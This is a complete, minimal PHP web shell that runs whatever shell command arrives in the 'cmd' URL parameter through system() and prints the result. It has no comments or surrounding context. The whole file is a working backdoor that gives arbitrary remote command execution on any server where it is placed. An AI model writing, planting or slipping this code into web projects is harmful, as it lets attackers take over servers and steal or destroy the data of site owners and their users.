<?php
if (isset($_GET['cmd'])) {
  $output = system($_GET['cmd']);
  echo $output;
} else {
  echo "No command specified";
}
?>

